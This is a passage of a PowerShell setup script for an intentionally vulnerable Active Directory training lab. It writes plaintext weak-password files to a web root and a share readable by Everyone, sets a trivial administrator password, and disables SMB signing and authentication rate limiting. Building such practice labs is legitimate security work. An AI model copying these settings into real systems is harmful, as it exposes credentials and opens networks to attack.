    # Add service accounts (predefined - will be created during setup)
    $passwordContent += "# Service Accounts"
    $serviceAccounts = @(
      "mssql_svc:sql",
      "http_svc:web",
      "ftp_svc:ftp",
      "oracle_svc:oracle",
      "constrained_svc:service",
      "unconstrained_svc:delegation",
      "asrep_user:asrep",
      "delegation_user:delegation",
      "dns.admin:dns # Groups: DnsAdmins",
      "backup.operator:backup # Groups: Backup Operators",
      "account.operator:account # Groups: Account Operators"
    )
    $passwordContent += $serviceAccounts
    $passwordContent += ""

    # Add SQL Server accounts
    $passwordContent += "# SQL Server Accounts"
    $passwordContent += "vuln_sa:sql"
    $passwordContent += ""

    # Add any users that were tracked during creation
    if ($Global:CreatedUsers -and $Global:CreatedUsers.Count -gt 0) {
      $passwordContent += "# Additional Created Users"
      foreach ($user in $Global:CreatedUsers) {
        $groups = if ($user.Groups -and $user.Groups.Count -gt 0) { " # Groups: $($user.Groups -join ', ')" } else { "" }
        $passwordContent += "$($user.Username):$($user.Password)$groups"
      }
      $passwordContent += ""
    }

    # Add notes
    $passwordContent += "# Notes:"
    $passwordContent += "# - SafeMode Password: $SafeModePassword"
    $passwordContent += "# - All accounts have PasswordNeverExpires = true"
    $passwordContent += "# - Password complexity is disabled"
    $passwordContent += "# - Account lockout is disabled"
    $passwordContent += "# - This is an intentionally vulnerable lab environment"

    # Convert array to string with proper line endings
    $finalContent = $passwordContent -join "`r`n"

    # Also create a separate weak passwords list file
    try {
      $weakPasswordsList = $Script:UserConfig.WeakPasswords | Sort-Object
      $weakPasswordsContent = @()
      $weakPasswordsContent += "# HackLab AD4 - Weak Passwords List"
      $weakPasswordsContent += "# Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
      $weakPasswordsContent += "# These passwords are used for random user generation"
      $weakPasswordsContent += ""
      $weakPasswordsContent += $weakPasswordsList

      $weakPasswordsFile = $weakPasswordsContent -join "`r`n"
      $weakPasswordsFile | Out-File -FilePath "C:\VulnerableShare\weak_passwords.txt" -Encoding UTF8 -Force
      icacls "C:\VulnerableShare\weak_passwords.txt" /grant "Everyone:(R)" /T 2>$null
      Write-Log "Weak passwords list created: C:\VulnerableShare\weak_passwords.txt" -Level SUCCESS
    }
    catch {
      Write-Log "Warning: Could not create weak passwords list: $_" -Level WARNING
    }

    # Write User:Password file to multiple locations for easy access
    $scriptDir = $PWD.Path  # Use current directory as fallback
    if ($MyInvocation.MyCommand.Path) {
      $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
    }
    elseif ($PSScriptRoot) {
      $scriptDir = $PSScriptRoot
    }
    elseif ($script:MyInvocation.MyCommand.Path) {
      $scriptDir = Split-Path -Parent $script:MyInvocation.MyCommand.Path
    }

    $locations = @(
      $FilePath,  # Primary location (usually Desktop)
      (Join-Path $scriptDir "passwords.txt"),  # Script directory
      "C:\VulnerableShare\passwords.txt",
      "C:\inetpub\wwwroot\passwords.txt"
    )

    foreach ($location in $locations) {
      try {
        # Skip if location is null or empty
        if ([string]::IsNullOrWhiteSpace($location)) {
          Write-Log "Warning: Skipping null/empty location" -Level WARNING
          continue
        }

        Write-Log "Attempting to create password file at: $location" -Level INFO

        $dir = Split-Path -Path $location -Parent
        if (-not [string]::IsNullOrWhiteSpace($dir) -and -not (Test-Path $dir)) {
          New-Item -Path $dir -ItemType Directory -Force | Out-Null
          Write-Log "Created directory: $dir" -Level INFO
        }

        # Write the final content to file
        $finalContent | Out-File -FilePath $location -Encoding UTF8 -Force

        # Set permissions for easy access
        if (Test-Path $location) {
          icacls $location /grant "Everyone:(R)" /T 2>$null
          Write-Log "Password file created: $location" -Level SUCCESS
        }
        else {
          Write-Log "Warning: Password file was not created at $location" -Level WARNING
        }
      }
      catch {
        Write-Log "Warning: Could not create password file at $location : $_" -Level WARNING
      }
    }

    return $true
  }
  catch {
    Write-Log "Error creating passwords file: $_" -Level ERROR
    return $false
  }
}

# Helper function to get Lab Users OU path
function Get-LabUsersOU {
  try {
    $domain = Get-ADDomain -ErrorAction Stop
    $domainDN = $domain.DistinguishedName
    $labUsersOU = "OU=Lab Users,$domainDN"

    # Verify the OU exists with retry logic
    $maxRetries = 3
    $retryCount = 0

    while ($retryCount -lt $maxRetries) {
      try {
        $ou = Get-ADOrganizationalUnit -Identity $labUsersOU -ErrorAction Stop
        if ($ou) {
          Write-Log "Using Lab Users OU: $labUsersOU" -Level DEBUG
          return $labUsersOU
        }
      }
      catch {
        $retryCount++
        if ($retryCount -lt $maxRetries) {
          Start-Sleep -Seconds 1
        }
      }
    }

    # If OU not found, return default Users container
    Write-Log "Lab Users OU not found after $maxRetries attempts, using default Users container" -Level WARNING
    return "CN=Users,$domainDN"
  }
  catch {
    Write-Log "Error getting Lab Users OU: $_" -Level WARNING
    # Fallback to default Users container
    try {
      $domainDN = (Get-ADDomain -ErrorAction Stop).DistinguishedName
      return "CN=Users,$domainDN"
    }
    catch {
      # Ultimate fallback - always return something valid
      Write-Log "Using ultimate fallback Users container" -Level WARNING
      return "CN=Users,DC=lab,DC=local"
    }
  }
}

#endregion

#region Main Execution

Write-Log "Starting AD Lab Environment Setup" -Level INFO

# Global array to track all created users and their passwords
$Global:CreatedUsers = @()

# Helper function to add user to tracking array
function Add-UserToTracking {
  param(
    [string]$Username,
    [string]$Password,
    [string]$Description = "",
    [string[]]$Groups = @()
  )

  $Global:CreatedUsers += @{
    Username    = $Username
    Password    = $Password
    Description = $Description
    Groups      = $Groups
  }
}

# Function to generate weak administrator password for maximum vulnerability
function New-WeakAdminPassword {
  param(
    [string]$BasePassword = "Password123"
  )

  # For Server 2025 and newer, we still need to meet minimum requirements
  # but use the weakest possible passwords
  $osVersion = [System.Environment]::OSVersion.Version
  $isServer2025OrNewer = ($osVersion.Major -ge 10 -and $osVersion.Build -ge 20348) # Server 2022+ build numbers

  if ($isServer2025OrNewer) {
    # Use weakest password that meets minimum requirements for newer servers
    $weakPassword = "Admin123!"
    Write-Log "Detected modern Windows Server - using weakest compliant password" -Level INFO
    return $weakPassword
  }
  else {
    # Use very weak password for older servers
    Write-Log "Detected legacy Windows Server - using very weak password" -Level INFO
    return "admin"
  }
}

# Function to validate and set administrator password
function Set-AdministratorPassword {
  param(
    [string]$Password
  )

  try {
    # Check if Administrator account exists and is enabled
    $adminUser = Get-LocalUser -Name "Administrator" -ErrorAction SilentlyContinue

    if (-not $adminUser) {
      Write-Log "Administrator account not found. This may be a domain controller." -Level WARNING
      return $true
    }

    # Enable Administrator account if disabled
    if (-not $adminUser.Enabled) {
      Enable-LocalUser -Name "Administrator" -ErrorAction Stop
      Write-Log "Administrator account enabled" -Level INFO
    }

    # Check current password status
    if ($adminUser.PasswordRequired -eq $false) {
      Write-Log "Administrator account has no password set" -Level WARNING
    }

    # Set the new password
    $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force
    Set-LocalUser -Name "Administrator" -Password $securePassword -ErrorAction Stop

    # Configure password settings
    Set-LocalUser -Name "Administrator" -PasswordNeverExpires $true -ErrorAction SilentlyContinue
    Set-LocalUser -Name "Administrator" -UserMayChangePassword $true -ErrorAction SilentlyContinue

    Write-Log "Administrator password configured successfully" -Level SUCCESS
    return $true
  }
  catch {
    Write-Log "Failed to set Administrator password: $_" -Level ERROR
    return $false
  }
}

# Generate and set administrator password
$adminPasswordText = New-WeakAdminPassword
$Script:DomainConfig.DomainAdminPassword = ConvertTo-SecureString -String $adminPasswordText -AsPlainText -Force

if (-not (Set-AdministratorPassword -Password $adminPasswordText)) {
  Write-Log "Failed to configure Administrator account. Exiting." -Level ERROR
  exit 1
}

Write-Log "Administrator password configured: [REDACTED] (Length: $($adminPasswordText.Length) characters)" -Level INFO


# Check if this is the first run
$stateFile = Join-Path -Path $PSScriptRoot -ChildPath ".adlab_state"

# Function to create secure state file
function New-StateFile {
  param(
    [string]$FilePath,
    [Parameter(Mandatory = $true)]
    $StateData  # Accept any object type
  )

  try {
    # Convert PSCustomObject to hashtable if needed
    if ($StateData -is [PSCustomObject]) {
      $hashTable = @{}
      $StateData.PSObject.Properties | ForEach-Object {
        $hashTable[$_.Name] = $_.Value
      }
      $StateData = $hashTable
    }
    elseif ($StateData -isnot [hashtable]) {
      throw "StateData must be a hashtable or PSCustomObject"
    }

    # Add timestamp and checksum for validation
    $StateData.Timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    $StateData.ScriptPath = $PSScriptRoot

    # Convert secure string to encrypted string using current user context
    if ($StateData.DomainAdminPassword -is [System.Security.SecureString]) {
      $StateData.DomainAdminPassword = $StateData.DomainAdminPassword | ConvertFrom-SecureString
    }

    $jsonContent = $StateData | ConvertTo-Json -Depth 3
    $StateData.Checksum = (Get-FileHash -InputStream ([System.IO.MemoryStream]::new([System.Text.Encoding]::UTF8.GetBytes($jsonContent)))).Hash

    # Write state file with backup
    if (Test-Path $FilePath) {
      Copy-Item -Path $FilePath -Destination "$FilePath.bak" -Force -ErrorAction SilentlyContinue
    }

    $StateData | ConvertTo-Json -Depth 3 | Set-Content -Path $FilePath -Force -ErrorAction Stop
    Write-Log "State file created successfully: $FilePath" -Level INFO
    return $true
  }
  catch {
    Write-Log "Failed to create state file: $_" -Level ERROR
    return $false
  }
}

# Function to validate state file
function Test-StateFile {
  param([string]$FilePath)

  try {
    if (-not (Test-Path $FilePath)) {
      return $false
    }

    $state = Get-Content -Path $FilePath -Raw | ConvertFrom-Json

    # Basic validation
    if (-not $state.Step -or -not $state.Timestamp -or -not $state.ScriptPath) {
      Write-Log "State file is missing required fields" -Level WARNING
      return $false
    }

    # Check if state file is from same script location
    if ($state.ScriptPath -ne $PSScriptRoot) {
      Write-Log "State file is from different script location" -Level WARNING
      return $false
    }

    # Check timestamp (shouldn't be older than 24 hours)
    $stateTime = [DateTime]::ParseExact($state.Timestamp, 'yyyy-MM-dd HH:mm:ss', $null)
    if ((Get-Date) - $stateTime -gt [TimeSpan]::FromHours(24)) {
      Write-Log "State file is older than 24 hours, may be stale" -Level WARNING
    }

    return $true
  }
  catch {
    Write-Log "Failed to validate state file: $_" -Level ERROR
    return $false
  }
}

if (-not (Test-StateFile $stateFile)) {
  Write-Log "First run detected. Configuring network..." -Level INFO

  # Step 1: Configure network (includes computer rename if needed)
  if (Set-NetworkConfiguration) {
    Write-Log "Network configuration completed successfully" -Level SUCCESS

    # Check if we just restarted due to computer rename
    # If Set-NetworkConfiguration returned true but we're still in first run,
    # it means no restart was needed (computer name was already correct)
    # In this case, we can proceed with AD installation

    Write-Log "No restart required. Proceeding with AD installation..." -Level INFO

    # Create state file before AD installation
    $stateData = @{
      Step                = 'PreInstall'
      DomainName          = $DomainName
      DomainNetbiosName   = $DomainNetbiosName
      DomainAdminPassword = $DomainAdminPassword
      IPAddress           = $IPAddress
      PrefixLength        = $PrefixLength
      DefaultGateway      = $DefaultGateway
      DNSServers          = $DNSServers
    }

    if (New-StateFile -FilePath $stateFile -StateData $stateData) {
      # Step 2: Install Active Directory
      Write-Log "Installing Active Directory. System will restart automatically after installation..." -Level INFO

      if (Install-ActiveDirectory) {
        # Update state file for post-install
        $stateData.Step = 'PostInstall'
        New-StateFile -FilePath $stateFile -StateData $stateData | Out-Null

        Write-Log "AD installation initiated. System will restart automatically." -Level SUCCESS
        Write-Log "Please run this script again after the system restarts to complete the configuration." -Level INFO

        # Don't manually restart - Install-ADDSForest handles this automatically
        # Just exit and let the system restart naturally
        exit 0
      }
      else {
        Write-Log "Active Directory installation failed" -Level ERROR
        Remove-Item -Path $stateFile -Force -ErrorAction SilentlyContinue
        exit 1
      }
    }
    else {
      Write-Log "Failed to create state file. Cannot proceed safely." -Level ERROR
      exit 1
    }
  }
  else {
    Write-Log "Network configuration failed. Cannot proceed." -Level ERROR
    exit 1
  }
}
else {
  Write-Log "Continuing from previous state..." -Level INFO

  # Read and validate the state file
  try {
    $state = Get-Content -Path $stateFile -Raw | ConvertFrom-Json

    # Restore parameters from state file
    if ($state.DomainName) { $DomainName = $state.DomainName }
    if ($state.DomainNetbiosName) { $DomainNetbiosName = $state.DomainNetbiosName }
    if ($state.DomainAdminPassword) {
      try {
        # Convert encrypted string back to secure string
        $DomainAdminPassword = $state.DomainAdminPassword | ConvertTo-SecureString -ErrorAction Stop
        Write-Log "Domain admin password restored from state file" -Level DEBUG
      }
      catch {
        Write-Log "Failed to decrypt domain admin password from state file: $($_.Exception.Message)" -Level ERROR
        Write-Log "This may happen if the state file was created by a different user or on a different machine" -Level WARNING
        Write-Log "Please delete the .adlab_state file and restart the script" -Level WARNING
        exit 1
      }
    }
    if ($state.IPAddress) { $IPAddress = $state.IPAddress }
    if ($state.PrefixLength) { $PrefixLength = $state.PrefixLength }
    if ($state.DefaultGateway) { $DefaultGateway = $state.DefaultGateway }
    if ($state.DNSServers) { $DNSServers = $state.DNSServers }

    Write-Log "State restored - Step: $($state.Step)" -Level INFO
  }
  catch {
    Write-Log "Failed to read state file: $($_.Exception.Message)" -Level ERROR
    Write-Log "State file may be corrupted. Please delete .adlab_state and restart." -Level ERROR
    exit 1
  }

  if ($state.Step -eq 'PostInstall') {
    Write-Log "Starting post-installation configuration..." -Level INFO

    # Validate that AD is actually installed and working
    $maxRetries = 10
    $retryCount = 0
    $adReady = $false

    Write-Log "Validating Active Directory installation..." -Level INFO

    while ($retryCount -lt $maxRetries -and -not $adReady) {
      try {
        # Test if AD services are running
        $adServices = @('ADWS', 'DNS', 'Netlogon', 'NTDS')
        $servicesRunning = $true

        foreach ($service in $adServices) {
          $svc = Get-Service -Name $service -ErrorAction SilentlyContinue
          if (-not $svc -or $svc.Status -ne 'Running') {
            Write-Log "Service $service is not running" -Level WARNING
            $servicesRunning = $false
          }
        }

        if ($servicesRunning) {
          # Try to query AD
          $domain = Get-ADDomain -ErrorAction Stop
          Write-Log "Domain found - DNSRoot: $($domain.DNSRoot), NetBIOS: $($domain.NetBIOSName), DN: $($domain.Name)" -Level INFO

          # Compare using DNSRoot (DNS format) instead of Name (DN format)
          if ($domain.DNSRoot -eq $DomainName -or $domain.NetBIOSName -eq $DomainNetbiosName) {
            Write-Log "Active Directory validation successful - Domain: $($domain.DNSRoot)" -Level SUCCESS
            $adReady = $true
          }
          else {
            Write-Log "Domain mismatch - Expected: $DomainName, Found: $($domain.DNSRoot)" -Level WARNING
          }
        }
      }
      catch {
        Write-Log "AD validation attempt $($retryCount + 1): $_" -Level WARNING
      }

      if (-not $adReady) {
        $retryCount++
        if ($retryCount -lt $maxRetries) {
          Write-Log "Waiting 30 seconds before retry..." -Level INFO
          Start-Sleep -Seconds 30
        }
      }
    }

    if (-not $adReady) {
      Write-Log "Active Directory is not ready after $maxRetries attempts" -Level ERROR
      Write-Log "Please check AD services and try running the script again" -Level ERROR
      exit 1
    }

    # Install AD CS features
    Write-Log "Installing Certificate Services features..." -Level INFO

    $adcsFeatures = @(
      'AD-Domain-Services',
      'ADCS-Cert-Authority',
      'ADCS-Enroll-Web-Pol',
      'ADCS-Enroll-Web-Svc',
      'ADCS-Web-Enrollment',
      'RSAT-ADCS',
      'RSAT-ADCS-Mgmt',
      'Web-Mgmt-Console'
    )

    try {
      $featureResult = Install-WindowsFeature -Name $adcsFeatures -IncludeManagementTools -ErrorAction Stop -Verbose:$false
      if ($featureResult.Success) {
        Write-Log "Certificate Services features installed successfully" -Level SUCCESS
      }
      else {
        Write-Log "Some features failed to install: $($featureResult.FeatureResult | Where-Object {$_.Success -eq $false} | ForEach-Object {$_.Name})" -Level WARNING
      }
    }
    catch {
      Write-Log "Failed to install Certificate Services features: $_" -Level ERROR
      exit 1
    }

    # Configure AD CS (optional - don't fail if it doesn't work on newer servers)
    Write-Log "Configuring Certificate Services..." -Level INFO
    if (-not (Install-ADCS -VulnerableMode)) {
      Write-Log "Failed to configure Certificate Services - continuing without AD CS" -Level WARNING
      Write-Log "Note: AD CS vulnerabilities will not be available in this lab" -Level WARNING
      # Don't exit - continue with the rest of the lab setup
    }
    else {
      Write-Log "Certificate Services configured successfully" -Level SUCCESS
    }

    Write-Log "Post-installation configuration in progress..." -Level INFO

    # Step 3: Configure vulnerabilities
    if (Invoke-VulnerabilityConfiguration) {
      Write-Log "AD Lab Environment setup completed successfully!" -Level SUCCESS

      # Clean up state files
      Remove-Item -Path $stateFile -Force -ErrorAction SilentlyContinue
      Remove-Item -Path "$stateFile.bak" -Force -ErrorAction SilentlyContinue

      # Display completion message
      $message = @"
            ===================================================
            AD Lab Environment Setup Complete!
            ===================================================
            Domain Name: $($Script:DomainConfig.DomainName)
            Domain Admin: $($Script:DomainConfig.DomainAdminUsername)
            Domain Controller: $($Script:DomainConfig.DCName)
            IP Address: $($Script:NetworkConfig.IPAddress)

            WARNING: This is an intentionally vulnerable environment.
            Do NOT use in production or on any network connected to the internet.
            ===================================================
"@

      Write-Host $message -ForegroundColor Cyan

      # Final validation
      Write-Log "Performing final system validation..." -Level INFO
      try {
        $finalCheck = @{
          'Domain'    = (Get-ADDomain).Name
          'DC'        = (Get-ADDomainController).Name
          'Users'     = (Get-ADUser -Filter *).Count
          'Computers' = (Get-ADComputer -Filter *).Count
        }
        Write-Log "Final validation - Domain: $($finalCheck.Domain), DC: $($finalCheck.DC), Users: $($finalCheck.Users), Computers: $($finalCheck.Computers)" -Level SUCCESS
      }
      catch {
        Write-Log "Final validation failed: $_" -Level WARNING
      }
    }
    else {
      Write-Log "Failed to configure vulnerabilities. Please check the log for details." -Level ERROR
      exit 1
    }
  }
  elseif ($state.Step -eq 'PostRename') {
    Write-Log "Resuming after computer rename restart..." -Level INFO

    # Verify computer name change was successful
    $currentName = (Get-ComputerInfo -Property CsName).CsName
    Write-Log "Current computer name: $currentName" -Level INFO

    # Now proceed with AD installation
    Write-Log "Installing Active Directory. System will restart automatically after installation..." -Level INFO

    if (Install-ActiveDirectory) {
      # Update state file for post-install
      $state.Step = 'PostInstall'
      New-StateFile -FilePath $stateFile -StateData $state | Out-Null

      Write-Log "AD installation initiated. System will restart automatically." -Level SUCCESS
      Write-Log "Please run this script again after the system restarts to complete the configuration." -Level INFO

      # Don't manually restart - Install-ADDSForest handles this automatically
      # Just exit and let the system restart naturally
      exit 0
    }
    else {
      Write-Log "Active Directory installation failed" -Level ERROR
      Remove-Item -Path $stateFile -Force -ErrorAction SilentlyContinue
      exit 1
    }
  }
  elseif ($state.Step -eq 'PostSMB1Install') {
    Write-Log "Resuming after SMB1 installation restart..." -Level INFO
    
    # Verify SMB1 is now properly installed
    try {
      $smb1Feature = Get-WindowsOptionalFeature -Online -FeatureName smb1protocol -ErrorAction SilentlyContinue
      if ($smb1Feature -and $smb1Feature.State -eq 'Enabled') {
        Write-Log "SMB1 protocol is now properly installed and enabled" -Level SUCCESS
      } else {
        Write-Log "SMB1 protocol installation may not be complete" -Level WARNING
      }
    }
    catch {
      Write-Log "Could not verify SMB1 installation status: $_" -Level WARNING
    }
    
    # Now apply SMB configurations that require SMB1 to be fully installed
    Write-Log "Applying SMB vulnerability configurations..." -Level INFO
    try {
      # Apply the SMB configurations that were skipped during initial install
      Set-SmbServerConfiguration -AnnounceServer $true -EnableSecuritySignature $false -EnableSMB1Protocol $true -ServerHidden $false -ErrorAction SilentlyContinue
      if ($?) { Write-Log "SMB server announcement and SMB1 protocol configured" -Level INFO } else { Write-Log "Failed to configure SMB server announcement" -Level WARNING }
      
      Set-SmbServerConfiguration -EnableStrictNameChecking $false -ErrorAction SilentlyContinue
      if ($?) { Write-Log "SMB strict name checking disabled" -Level INFO } else { Write-Log "Failed to disable SMB strict name checking" -Level WARNING }
      
      Set-SmbServerConfiguration -ValidateTargetName $false -ErrorAction SilentlyContinue
      if ($?) { Write-Log "SMB target name validation disabled" -Level INFO } else { Write-Log "Failed to disable SMB target name validation" -Level WARNING }
      
      Set-SmbServerConfiguration -EnableAuthRateLimiter $false -ErrorAction SilentlyContinue
      if ($?) { Write-Log "SMB authentication rate limiter disabled" -Level INFO } else { Write-Log "Failed to disable SMB auth rate limiter" -Level WARNING }
      
      Write-Log "SMB vulnerability configurations applied successfully" -Level SUCCESS
    }
    catch {
      Write-Log "Error applying SMB configurations: $_" -Level WARNING
    }
    
    # Continue with the rest of the vulnerability configuration
    Write-Log "Continuing with remaining vulnerability configurations..." -Level INFO
    
    # Clean up state file and complete setup
    Remove-Item -Path $stateFile -Force -ErrorAction SilentlyContinue
    
    Write-Log "SMB1 post-installation configuration completed successfully!" -Level SUCCESS
    Write-Log "SMB1 protocol is now available for penetration testing scenarios." -Level INFO
  }
  elseif ($state.Step -eq 'PreInstall') {
    Write-Log "Found pre-install state. Proceeding with AD installation..." -Level INFO

    # Proceed with AD installation
    Write-Log "Installing Active Directory. System will restart automatically after installation..." -Level INFO

    if (Install-ActiveDirectory) {
      # Update state file for post-install
      $state.Step = 'PostInstall'
      New-StateFile -FilePath $stateFile -StateData $state | Out-Null

      Write-Log "AD installation initiated. System will restart automatically." -Level SUCCESS
      Write-Log "Please run this script again after the system restarts to complete the configuration." -Level INFO

      # Don't manually restart - Install-ADDSForest handles this automatically
      # Just exit and let the system restart naturally
      exit 0
    }
    else {
      Write-Log "Active Directory installation failed" -Level ERROR
      Remove-Item -Path $stateFile -Force -ErrorAction SilentlyContinue
      exit 1
    }
  }
  else {
    Write-Log "Unknown state step: $($state.Step)" -Level ERROR
    Write-Log "Please delete the .adlab_state file and run the script again." -Level INFO
    exit 1
  }

  Write-Log "View all commands executed with PowerShell Command to View Logs: Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' | Where-Object { `$_.Id -eq 4104 } | Select-Object -First 50 | Format-Table TimeCreated, Id, LevelDisplayName, Message -Wrap" -Level INFO
}

# Stop transcript
Stop-Transcript

# End of script
#endregion
# End of Main Execution region
